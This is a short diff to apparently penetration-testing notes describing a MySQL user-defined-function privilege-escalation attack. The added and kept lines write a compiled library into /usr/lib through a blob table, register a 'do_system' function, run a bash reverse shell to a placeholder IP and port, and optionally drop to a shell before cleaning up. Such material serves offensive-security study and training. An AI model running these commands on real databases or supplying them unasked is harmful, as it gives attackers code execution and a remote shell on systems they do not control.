@@ -559,12 +559,17 @@ gcc -g -shared -Wl,-soname,x.so -o x.so x.o -lc
 
 ```
 mysql -u root -p
+use mysql;
+create table foo(line blob);
 insert into foo values(load_file('/dev/shm/x.so'));
-select * from foo into dumpfile '/usr/lib/x.so';
-create function do_system returns integer soname 'x.so';
+select * from foo into dumpfile '/usr/lib/x1.so';
+create function do_system returns integer soname 'x1.so';
 select * from mysql.func;
-select do_system('id > /tmp/x; chown <username>.<username> /tmp/x');
 select do_system('bash -c "bash -i >& /dev/tcp/<ip>/<port> 0>&1"');
+(Optional)
+\! sh
+drop table foo;
+drop function do_system;
 ```
 
 UDF Source code
